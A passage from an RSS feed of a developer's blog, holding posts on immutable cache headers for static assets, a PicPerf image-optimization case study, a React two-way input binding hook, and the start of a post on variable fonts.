Sep 2023 23:47:20 GMT</pubDate><content:encoded>&lt;p&gt;We&apos;ve got it real good when it comes to standing up websites these days (especially static ones). Modern hosts like Vercel and Netlify take care of a &lt;em&gt;lot&lt;/em&gt; out of the box, shielding us from the meticulous, complicated stuff.&lt;/p&gt;&lt;p&gt;Caching is one of them. To accommodate the widest range of users, many providers will cache static assets with a &lt;code&gt;Cache-Control&lt;/code&gt; header of &lt;code&gt;public&lt;/code&gt;, &lt;code&gt;max-age=0&lt;/code&gt;, &lt;code&gt;must-revalidate&lt;/code&gt;. Translation: &lt;/p&gt;&lt;blockquote&gt;Cache this thing, but immediately let it go stale and ask the origin server if there&apos;s a fresh copy to download next time around.&lt;/blockquote&gt;&lt;p&gt;It&apos;s a smart default. On each subsequent visit to a page, the browser will &lt;em&gt;always&lt;/em&gt; check in with the origin server (or global CDN) for the latest version of the asset, but it&apos;ll only actually perform a full download &lt;em&gt;if those assets have changed. &lt;/em&gt;If everything&apos;s the same, you&apos;ll get a &lt;code&gt;304 Not Modified&lt;/code&gt; response back, and the browser&apos;s &quot;stale&quot; version will be used. Like this: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-4.png&quot; alt=&quot;non-initial page views with default caching&quot; loading=&quot;lazy&quot; width=&quot;1410&quot; height=&quot;1302&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;non-initial page views with default caching&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Even though it&apos;s performing a distinct GET request to perform that check, if it returns with 304, it&apos;ll end up being far smaller &amp;amp; faster than full fetch with a 200. For example, here are a couple of actual requests for a font file from my site. The one that came back with a 304 had a significantly smaller footprint.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/08/image-6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1222&quot; height=&quot;182&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;screenshot comparing the duration of a 304 and a 200 response&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;So, while it may sound counterintuitive to immediately let something cached go stale, it&apos;s a good balance between performance and flexibility. It&apos;ll save some headaches too. You won&apos;t end up with someone being served outdated CSS or a previous deployment&apos;s JavaScript bundle. Ship as much as you want, and your users will get the latest. If you&apos;d like to dig more into this specific caching strategy, both &lt;a href=&quot;https://www.netlify.com/blog/2017/02/23/better-living-through-caching/?ref=cms.macarthur.me&quot;&gt;Netlify&lt;/a&gt; and &lt;a href=&quot;https://vercel.com/docs/edge-network/caching?ref=cms.macarthur.me#static-files-caching&quot;&gt;Vercel&lt;/a&gt; have some information on the philosophy behind it.&lt;/p&gt;&lt;p&gt;Even so, if you consider yourself a performance scrutineer, it should bother you that you&apos;re leaving some speed on the table by sticking with these defaults. Your caching &lt;em&gt;could be a little more aggressive&lt;/em&gt;, and in my opinion, it&apos;s a no-brainer for particular types of assets. &lt;/p&gt;&lt;h2&gt;Some Things Never Change&lt;/h2&gt;&lt;p&gt;For a typical content site, most of the assets served via URL aren&apos;t dynamic. The same pile of CSS will be used for every visitor. Same story for fonts, individual images, and JavaScript bundles. Certain things just aren&apos;t designed to change based on who made the request or when it was performed, and it&apos;s technically wasteful to perform an extra HTTP request (albeit a small one) when you&apos;re likely to get back 304 anyway. &lt;/p&gt;&lt;p&gt;You can virtually eliminate those unnecessary requests by using a cache header like this instead.&lt;/p&gt;&lt;p&gt;&lt;code&gt;public, max-age=31560000, immutable&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Here&apos;s what it means: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;public&lt;/code&gt; - the asset can be stored in any cache between (and including) the browser and origin server&lt;/li&gt;&lt;li&gt;&lt;code&gt;max-age=31560000&lt;/code&gt; - the cache doesn&apos;t have to consider it &quot;stale&quot; until a full year has passed&lt;/li&gt;&lt;li&gt;&lt;code&gt;immutable&lt;/code&gt; - the browser is explicitly instructed to NOT reach out to origin/CDN just to check if something newer is available (no more revalidation requests)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;With that policy in place, after a page has been visited for the first time, each asset is loaded straight from the cache, and the flow ends up looking more like this:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-10.png&quot; alt=&quot;non-initial page views with smarter caching&quot; loading=&quot;lazy&quot; width=&quot;1162&quot; height=&quot;1122&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;non-initial page views with smarter caching&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;As long as the browser&apos;s still got a cached copy of the asset (identified by unique URL), it&apos;ll be a full year before it ever checks origin again. That makes page performance marginally better, and you can feel a little better about yourself as an performance-minded engineer.&lt;/p&gt;&lt;h2&gt;Nothing Lasts Forever&lt;/h2&gt;&lt;p&gt;Ok. It&apos;s foolishly optimistic to say you&apos;ll never need to refresh assets before a year crawls by. You&apos;ll update a logo, refresh your site design, or swap out your fonts. It&apos;ll inevitably happen.&lt;/p&gt;&lt;p&gt;But serving fresh assets in those scenarios is a problem easy to solve with an age-old cache-busting tactic: &lt;strong&gt;fingerprinting&lt;/strong&gt;. Every time an asset&apos;s URL changes (it gets a new &quot;fingerprint&quot;), it&apos;ll force the browser and any intermediary cache to treat it as &lt;em&gt;a completely different asset&lt;/em&gt;. The URL serves as the cache key, and when it changes, it gets a new identity.&lt;/p&gt;&lt;p&gt;Most frameworks and site builders already do this for you out-of-the-box, by the way, so it&apos;s likely that you&apos;ll need to do nothing to benefit from it (at least for some asset types). For example, my site&apos;s on Astro. On every build, each static asset is given a very unique name:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image.png&quot; alt=&quot;example of a fingerprinted asset&quot; loading=&quot;lazy&quot; width=&quot;1550&quot; height=&quot;140&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And for the resources that aren&apos;t auto-fingerprinted, you&apos;ll get the same benefit using a different file name. For example:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;- &amp;lt;img src=&quot;./logo.svg&quot; alt=&quot;site logo&quot; /&amp;gt;
+ &amp;lt;img src=&quot;./logo-v2.svg&quot; alt=&quot;site logo&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All of this, by the way, is a good reason&lt;em&gt; not&lt;/em&gt; to use overly aggressive caching on your page&apos;s HTML itself. The URL of your home page will likely never change, and so it&apos;s just not practical to cache it for a year with no revalidation. That&apos;s the advantage static assets have over an HTML document. The cache keys of static resources only matter to the HTML that references them. As long as the code&apos;s pointed to the correct versions, it doesn&apos;t matter what they&apos;re named or how frequently they&apos;re changed.&lt;/p&gt;&lt;h2&gt;How do I do it?&lt;/h2&gt;&lt;p&gt;Implementing this highly depends on how you&apos;re hosting your site, but before you do, get clear on which types of assets you&apos;d like to cache more aggressively. For my own site, that&apos;s every &lt;code&gt;.js&lt;/code&gt;, &lt;code&gt;.css&lt;/code&gt;, and &lt;code&gt;.woff2&lt;/code&gt; file (my images are already routed through &lt;a href=&quot;https://www.picperf.dev/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;, so I&apos;m good there). That list is probably similar for you too.&lt;/p&gt;&lt;h3&gt;Customizing Headers on Vercel&lt;/h3&gt;&lt;p&gt;If you&apos;re on Vercel, you can update your &lt;code&gt;vercel.json&lt;/code&gt; file to &lt;a href=&quot;https://vercel.com/docs/edge-network/caching?ref=cms.macarthur.me#using-vercel.json-and-next.config.js&quot;&gt;set specific response headers&lt;/a&gt; on the assets you target. I use this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;{
	&quot;headers&quot;: [
    	{
			&quot;source&quot;: &quot;/(.+\\.js|.+\\.css|.+\\.woff2)&quot;,
			&quot;headers&quot;: [
				{
					&quot;key&quot;: &quot;Cache-Control&quot;,
					&quot;value&quot;: &quot;public, max-age=31560000, immutable&quot;
				}
			]
		}
	]
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Be careful writing that pattern, &lt;a href=&quot;https://vercel.com/docs/errors/error-list?ref=cms.macarthur.me#invalid-route-source-pattern&quot;&gt;by the way&lt;/a&gt;. Vercel follows the &lt;a href=&quot;https://github.com/pillarjs/path-to-regexp/tree/v6.1.0?ref=cms.macarthur.me&quot;&gt;path-to-regex&lt;/a&gt; syntax – not &lt;code&gt;RegExp&lt;/code&gt;. That&apos;s caused a moment or two of extreme frustration for me.&lt;/p&gt;&lt;h3&gt;Customizing Headers on Netlify&lt;/h3&gt;&lt;p&gt;Netlify has its own ways to &lt;a href=&quot;https://docs.netlify.com/routing/headers/?ref=cms.macarthur.me&quot;&gt;customize headers&lt;/a&gt; using a &lt;code&gt;_headers&lt;/code&gt; or &lt;code&gt;netlify.toml&lt;/code&gt; file. Here&apos;s the same setup using a &lt;code&gt;netlify.toml&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;[[headers]]
  for = &quot;/*.(css|js|woff2)&quot;
  [headers.values]
  Cache-Control = &quot;public, max-age=31536000, immutable&quot;&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt;Using Cloudflare&lt;/h3&gt;&lt;p&gt;If you&apos;re on a provider that doesn&apos;t permit customizing response headers so easily, you&apos;re not out of luck. You can set up a Cloudflare account to act as a reverse proxy and set the response headers using a &lt;a href=&quot;https://developers.cloudflare.com/rules/transform/response-header-modification/create-dashboard/?ref=cms.macarthur.me&quot;&gt;modification rule&lt;/a&gt;:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;914&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Or, if you&apos;d like to do it in a more interesting way, intercept the request and modify the response with a Cloudflare Worker. Use something like &lt;a href=&quot;https://github.com/kwhitley/itty-router?ref=cms.macarthur.me&quot;&gt;itty-router&lt;/a&gt; and it&apos;ll amount to less than 30 lines of code: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { Router, IRequest } from &quot;itty-router&quot;;

const router = Router();

router.get(&quot;/*.(css|js|woff2)&quot;, async (request: IRequest) =&amp;gt; {
  const response = await fetch(request);

	return new Response(response.body, {
		status: response.status,
		statusText: response.statusText,
		headers: {
			...response.headers,
			&quot;cache-control&quot;: &quot;public, max-age=31560000, immutable&quot;,
		},
	});
});

export default {
	async fetch(
		request: Request,
		env: {},
        context: ExecutionContext
	): Promise&amp;lt;Response&amp;gt; {
	context.passThroughOnException();

	return router.handle(request, env, context).then((response) =&amp;gt; response);
	},
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This, by the way, is the same approach used to cache every image optimized by &lt;a href=&quot;http://picperf.dev/?ref=cms.macarthur.me&quot;&gt;PicPerf.dev&lt;/a&gt;. I love it. &lt;/p&gt;&lt;h2&gt;Spend more time in the Network Tab.&lt;/h2&gt;&lt;p&gt;The only reason I started thinking about this was because I was curious about the network activity behind any given page load on my own site. It struck me as too much, considering my site&apos;s fairly simple and doesn&apos;t have any ads or other network-chatty things. It was fun, I learned a lot, and my site came out a little quicker in the process.&lt;/p&gt;&lt;p&gt;Dive into those tools yourself, and maybe you&apos;ll emerge with a similar tip of your own. If you do, I&apos;d love to hear it.&lt;/p&gt;</content:encoded></item><item><title>Reviewing PicPerf&apos;s Impact on SongwriterCity.com</title><link>https://macarthur.me/posts/picperf-impact-on-songwriter-city</link><guid isPermaLink="true">https://macarthur.me/posts/picperf-impact-on-songwriter-city</guid><pubDate>Mon, 21 Aug 2023 04:30:25 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://songwritercity.com/?ref=cms.macarthur.me&quot;&gt;Songwriter City&lt;/a&gt; in Nashville, TN specializes in bringing together music’s biggest hitmakers for incredible corporate, private and public events to be remembered.&lt;/p&gt;&lt;p&gt;Its website features images from several of those events, including profiles of some of the artists in their network. Just by activating PicPerf for those images, an impressive performance boost was brought to the site.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/08/image.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1500&quot; height=&quot;958&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/08/image.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/08/image.png 1000w, https://cms.macarthur.me/content/images/2023/08/image.png 1500w&quot; /&gt;&lt;figcaption&gt;Events put on by Songwriter City&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;&lt;strong&gt;The “Before” State&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;For this feature, we’ll focus on the site’s home page. Prior to enabling PicPerf, images were being loaded straight from the its WordPress instance. They were being routed through a CDN, which made them quickly available globally, but no optimizations or reformatting was happening.&lt;/p&gt;&lt;p&gt;Because of this, approximately &lt;strong&gt;2.2MB&lt;/strong&gt; of image data was being downloaded for the home page alone. They were being locally cached, but not as strictly as possible, causing the browser to perform a revalidation check on every load.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Enabling PicPerf&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Because Songwriter City’s on WordPress activating setting up PicPerf was extremely simple: install the official plugin.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/08/image-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1930&quot; height=&quot;208&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/08/image-1.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/08/image-1.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/08/image-1.png 1600w, https://cms.macarthur.me/content/images/2023/08/image-1.png 1930w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The plugin automatically filtered as many image URLs as possible, including those with &lt;code&gt;srcset&lt;/code&gt; attributes. When the page was reloaded, each image was processed in the background. And reloading the page once again resulted in freshly optimized and cached images being returned.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;The Impact&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;After that initial optimization, each image was now being served in an optimal format — WebP for most of them, although AVIF may be served for visitors whose browser supports it. And on top of that, aggressive cache headers were now being set, meaning a visitor’s browser will always use images they’ve already downloaded for repeat visits. There’d be no more “extra” requests back to the server.&lt;/p&gt;&lt;p&gt;In terms of raw metrics, a couple stick out. First, the amount of total image data downloaded for a visitor dropped significantly. Before enabling PicPerf, 2.2 megabytes were being sent over the wire as the vistor scrolled the length of the home page. A sizeable amount of data.&lt;/p&gt;&lt;p&gt;But after PicPerf had a chance to optimize and reformat the images, that value dropped to only 634 kilobytes — a whopping 72% less data.&lt;/p&gt;&lt;h4&gt;Change in Page Weight&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Stage&lt;/th&gt;
      &lt;th&gt;Total Image Weight&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Before&lt;/td&gt;
      &lt;td&gt;2.2MB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;After&lt;/td&gt;
      &lt;td&gt;0.634MB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;High&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;&lt;p&gt;Then, there’s the performance score provided by Google’s Lighthouse tool. This value can be a little misleading. It’s calculated by emulating an actual device and isn’t based on real-world data. Even, it’s often a good indicator of whether a site is headed in the right direction in terms of performance, SEO, and accessibility. And it can also help raise red flags that need to be addressed.&lt;/p&gt;&lt;p&gt;For Songwriter City’s site, Google’s Lighthouse performance score increased 11 points — a very healthy improvement for a very low-lift change.&lt;/p&gt;&lt;h4&gt;Change in Performance Score&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Stage&lt;/th&gt;
      &lt;th&gt;Lighthouse Performance Score&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Before&lt;/td&gt;
      &lt;td&gt;67/100&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;After&lt;/td&gt;
      &lt;td&gt;78/100&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Impact&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;&lt;p&gt;It’s encouraging and satisfying to see immediate feedback to key website metrics just by running a site’s images through PicPerf. It goes to show just how large of an impact using modern formats like WebP and AVIF can have. Still, even more meaningful benefits are yet to come. Over time, these changes will be factored into how Google calulates the site’s Core Web Vitals and ultimately how it factors those results into its search rankings.&lt;/p&gt;&lt;p&gt;Check out &lt;a href=&quot;https://songwritercity.com/?ref=cms.macarthur.me&quot;&gt;Songwriter City’s website&lt;/a&gt; directly to see these changes in action, and &lt;a href=&quot;https://app.picperf.dev/?ref=cms.macarthur.me&quot;&gt;sign up&lt;/a&gt; if you’d like to see what’s possible for your own site.&lt;/p&gt;</content:encoded></item><item><title>Building a Two-Way Data Binding Hook for Form Inputs in React</title><link>https://macarthur.me/posts/binding-input-state-in-react</link><guid isPermaLink="true">https://macarthur.me/posts/binding-input-state-in-react</guid><pubDate>Thu, 10 Aug 2023 14:29:35 GMT</pubDate><content:encoded>&lt;p&gt;A few days ago, I came across &lt;a href=&quot;https://twitter.com/saltyAom/status/1688247662280372224?ref=cms.macarthur.me&quot;&gt;a tweet&lt;/a&gt; semi-lamenting the fact that React doesn&apos;t have automatic input binding like &lt;a href=&quot;https://vuejs.org/guide/essentials/forms.html?ref=cms.macarthur.me&quot;&gt;Vue&lt;/a&gt; or &lt;a href=&quot;https://svelte.dev/tutorial/text-inputs?ref=cms.macarthur.me&quot;&gt;Svelte&lt;/a&gt;. If you&apos;re unfamiliar, the feature allows you to automatically update a piece of state whenever an input&apos;s value changes, just by adding a particular attribute. Here&apos;s how it looks in Vue, using &lt;code&gt;v-model&lt;/code&gt;. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;template&amp;gt;
	&amp;lt;input v-model=&quot;text&quot; /&amp;gt;

	Your Text: {{ text }}
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
export default {
	data() {
		return {
			text: &apos;initial text&apos;,
		};
	},
};
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Its non-existence in React really doesn&apos;t irk me that much, but I became interested in the idea when others started dreaming of an how an implementation might look in other frameworks. For example, &lt;a href=&quot;https://twitter.com/marvinhagemeist/status/1688512714807607296?ref=cms.macarthur.me&quot;&gt;this Preact version&lt;/a&gt; from Marvin Hagemeister using signals looks really slick.&lt;/p&gt;&lt;p&gt;React doesn&apos;t have first-class signals (yet), so I was left wondering what the &quot;React&quot; way of building something like that might entail and couldn&apos;t resist dabbling. I took to StackBlitz and ended up kinda liking &lt;a href=&quot;https://stackblitz.com/edit/stackblitz-starters-xntjyx?file=src%2FApp.js&amp;amp;ref=cms.macarthur.me&quot;&gt;how it turned out&lt;/a&gt;. Let&apos;s walk through it a bit.&lt;/p&gt;&lt;h2&gt;A Dishonorary Mention: Using HTML Attributes&lt;/h2&gt;&lt;p&gt;Inspired by Marvin&apos;s Preact example, I was optimistic about figuring out a non-signals way of making a simple HTML attribute approach work. I was aiming for something like this, wrapped up into a custom hook. Note the &lt;code&gt;data-bind&lt;/code&gt; attribute simply being set to the name of the state I want to bind:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default function App() {
  const [name] = useBoundState(&quot;&quot;);

  return (
    &amp;lt;div&amp;gt;
      &amp;lt;input bind-state=&quot;name&quot; /&amp;gt;
      
      Name: {name}
    &amp;lt;/div&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It didn&apos;t go well. We&apos;re dealing with plain, old attributes – not props – and so the only value type you can pass is a string. I couldn&apos;t pass around a reference to a state updater to trigger when an input is used.&lt;/p&gt;&lt;p&gt;I made the approach sorta &quot;work&quot; using a &lt;code&gt;Map()&lt;/code&gt; and directly querying the DOM via &lt;code&gt;.querySelectorAll()&lt;/code&gt;, but it&apos;s risky and clunky. No way I&apos;m dropping the code here. If you want to see it, check out &lt;a href=&quot;https://stackblitz.com/edit/stackblitz-starters-rxuw3o?file=src%2FApp.js&amp;amp;ref=cms.macarthur.me&quot;&gt;StackBlitz&lt;/a&gt;. And if you know of a way to make it work, drop a comment.&lt;/p&gt;&lt;h2&gt;Refs to the Rescue&lt;/h2&gt;&lt;p&gt;A way more satisfying effort was made with refs, React&apos;s native way of storing persistent references to objects (such as DOM nodes). Here&apos;s the API:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function SomeInput() {
  const [name, nameBinding] = useBoundState(&apos;&apos;);

  return (
    &amp;lt;&amp;gt;
      &amp;lt;input ref={nameBinding} /&amp;gt;
      &amp;lt;h3&amp;gt;Your Name:&amp;lt;/h3&amp;gt; {name}
    &amp;lt;/&amp;gt;
  );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I like it because it feels very much like any other &lt;code&gt;useState()&lt;/code&gt; hook. Pass in the initial value of the input, and you get back a tuple containing the state variable and a binding you&apos;ll attach to the input itself (as you&apos;ll see in the code below, that tuple also returns the state updater itself if it&apos;s needed). &lt;/p&gt;&lt;p&gt;That binding is just a ref. There&apos;s no magic going on. And the hook itself is pretty simple too.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function useBoundState(initialValue) {
	// Create ref for input element.
	const stateRef = useRef();
    
	// Create state for storing value.
	const [stateName, setState] = useState(initialValue);

	useEffect(() =&amp;gt; {
		function callback(e) {
			setState(e.target.value);
		}
		
		// Listen for input interactions.
		stateRef.current?.addEventListener(&apos;input&apos;, callback);

		// Clean up! 
		return () =&amp;gt; {
			stateRef.current?.removeEventListener(&apos;input&apos;, callback);
		};
	});

	// I&apos;m returning the state updater in there, 
	// in case it&apos;s ever needed for making direct updates.
	return [stateName, stateRef, setState];
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&apos;s the verbal breakdown: before that ref is returned, it&apos;s attached with an event listener to respond to any &lt;code&gt;input&lt;/code&gt; events triggered by putting text in the input. Whenever that event fires, that state is updated with the current value.&lt;/p&gt;&lt;p&gt;It&apos;ll work for any element that fires a &lt;code&gt;input&lt;/code&gt; event and has a &lt;code&gt;value&lt;/code&gt; property on it, so we could use it for an entire form (and it could be expanded to support other non-text inputs as well): &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function SomeForm() {
	const [textareaValue, textareaBinding] = useBoundState(&apos;&apos;);
	const [inputValue, inputBinding] = useBoundState(&apos;&apos;);

  	return (
		&amp;lt;form&amp;gt;
			&amp;lt;textarea ref={textareaBinding}&amp;gt;&amp;lt;/textarea&amp;gt;
			textarea value: {textareaValue}

			&amp;lt;input type=&quot;text&quot; ref={inputBinding} /&amp;gt;
			input value: {inputValue}
		&amp;lt;/form&amp;gt;
	);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s easy to make configurable too. For example, maybe you&apos;d like to update on &lt;code&gt;keydown&lt;/code&gt; instead of &lt;code&gt;input&lt;/code&gt;. We can enable that by introducing a second &quot;options&quot; parameter.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// `event` is now configurable:
function useBoundState(initialValue, { event = &apos;input&apos; } = {}) {
	// ... other code goes here.
    
	useEffect(() =&amp;gt; {
    	// Listener attached here...
		stateRef.current?.addEventListener(event, callback);

		// ... and cleaned  up here.
		return () =&amp;gt; {
			stateRef.current?.removeEventListener(event, callback);
		};
	});
  
	// ... other code goes here.
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You get the idea. Through using a couple features of React already available, it doesn&apos;t take much to capture some of the magic the binding magic other frameworks offer.&lt;/p&gt;&lt;h2&gt;Making It Two-Way&lt;/h2&gt;&lt;p&gt;But there is one more important piece to this: the binding needs to work &lt;em&gt;both ways&lt;/em&gt;. State should be updated when input values change, and &lt;em&gt;input values&lt;/em&gt; should change when &lt;em&gt;state&lt;/em&gt; is updated. Placing another &lt;code&gt;useEffect()&lt;/code&gt;hook in our &lt;code&gt;useBoundState()&lt;/code&gt; hooks makes that requirement pretty simple:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;useEffect(() =&amp;gt; {
	if (!stateRef.current) return;

	// Update input value whenever state changes.
	stateRef.current.value = stateName;
}, [stateName]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s comforting to know this won&apos;t cause any unwelcome side effects. Updating an input&apos;s &lt;code&gt;value&lt;/code&gt; arttribute directly doesn&apos;t trigger a new &lt;code&gt;input&lt;/code&gt; event, so nothing crazy will happen (like an infinite state-updating loop). &lt;/p&gt;&lt;p&gt;If you&apos;d like to get deep in the performance weeds here, you could spend some time figuring out how to prevent an attribute update only if we know the state change didn&apos;t come from our event listener&apos;s callback, during which we set the state ourselves. But I think that&apos;s a waste of time. It&apos;s all happening fast enough, and the amount of complexity that &quot;optimization&quot; would introduce isn&apos;t worth the effort.&lt;/p&gt;&lt;h2&gt;The Final Product&lt;/h2&gt;&lt;p&gt;With all those adjustments in place, here&apos;s the hook in entirety: &lt;/p&gt;&lt;figure&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;h2&gt;Would I actually use this?&lt;/h2&gt;&lt;p&gt;I suppose that&apos;s the most important question. For most use cases involving forms, probably not. The browser is already really good at handling form state out of the box, especially with the vanilla JavaScript APIs it offers. For example, the native &lt;code&gt;FormData()&lt;/code&gt; works great for directly accessing submitted input values, or sending the entire payload along to an endpoint:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;return (
	&amp;lt;form onSubmit={(e) =&amp;gt; {
		const formData = new FormData(e.target);

		// Get input values.
		const name = formData.get(&apos;name&apos;);

		// Send it somewhere.
		const response = await fetch(&quot;/some-place&quot;, {
			method: &quot;POST&quot;,
			body: formData,
		});
	}}
	&amp;gt;
		&amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;
		&amp;lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&amp;gt;
	&amp;lt;/form&amp;gt;
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That said, I can see it being useful in other scenarios, like when it&apos;s important to load every keystroke into state and you can&apos;t afford to wait until submission to do so. You get the idea. I know the use cases exist. &lt;/p&gt;&lt;p&gt;But even if I don&apos;t find myself reaching for it anytime soon, it was a fun exercise. Hope you agree. If you&apos;ve got another approach you&apos;ve baked yourself, I&apos;d love to see it.&lt;/p&gt;</content:encoded></item><item><title>Taking Variable Fonts for a Spin</title><link>https://macarthur.me/posts/variable-fonts</link><guid isPermaLink="true">https://macarthur.me/posts/variable-fonts</guid><pubDate>Mon, 24 Jul 2023 04:42:11 GMT</pubDate><content:encoded>&lt;p&gt;Every so often, I reencounter a web technology I nearly forgot existed. Not because it&apos;s old, but because it&apos;s so new and lacking in browser support that it&apos;s not worth my attention.&lt;/p&gt;&lt;p&gt;One of them is variable fonts. After being &lt;a href=&quot;https://medium.com/variable-fonts/https-medium-com-tiro-introducing-opentype-variable-fonts-12ba6cd2369?ref=cms.macarthur.me#.josnafajq&quot;&gt;first introduced&lt;/a&gt; in 2016, I just realized they have really &lt;a href=&quot;https://caniuse.com/variable-fonts?ref=cms.macarthur.me&quot;&gt;solid browser support&lt;/a&gt; all these years later. Google Fonts even started to roll out filtering by variable versions &lt;a href=&quot;https://css-tricks.com/google-fonts-variable-fonts/?ref=cms.macarthur.me&quot;&gt;back in 2020&lt;/a&gt;. That&apos;s like a generation ago in web years, so I figured it was time to give them a shot.&lt;/p&gt;&lt;p&gt;And it was pretty good timing. Since moving this site over to Astro (&lt;a href=&quot;https://www.macarthur.me/posts/what-i-like-about-astro?ref=cms.macarthur.me&quot;&gt;a great move&lt;/a&gt;, by the way), I&apos;d been relying on system fonts, but I&apos;ve meaning to switch over to something else. This was a good reason to see whether variable fonts provide enough benefit for your average bro&apos;s nerd blog – not just in terms of the typographical power, but also performance. Fonts are critical to a website, but they can also be hefty and &lt;a href=&quot;https://web.dev/font-best-practices/?ref=cms.macarthur.me&quot;&gt;complicated to use effectively&lt;/a&gt;. If variable fonts offer help on this front, I&apos;m in. &lt;/p&gt;&lt;h2&gt;Establishing a Baseline&lt;/h2&gt;&lt;p&gt;For this dabbling, I chose to work with Open Sans. It&apos;s a widely used font and readily available in both variable and static versions from &lt;a href=&quot;https://fontsource.org/?ref=cms.macarthur.me&quot;&gt;Fontsource&lt;/a&gt;, the provider I&apos;m using. &lt;/p&gt;&lt;p&gt;Rather than splitting hairs over the weights an average site would use, I just decided to go with the full gamut. I don&apos;t &lt;em&gt;think &lt;/em&gt;I use them all on my site, but between headings, subheadings, body copy, and the weird stuff I do in-between, it&apos;s close enough. &lt;/p&gt;&lt;p&gt;On the first pass, I loaded only the standard styles. No italic versions. It queued up an HTTP request for every individual weight, each coming in at around 17kb. It&apos;s more than I&apos;d like to load (which is zero), but nothing crazy at this point.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/05/image-4.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1632&quot; height=&quot;574&quot; 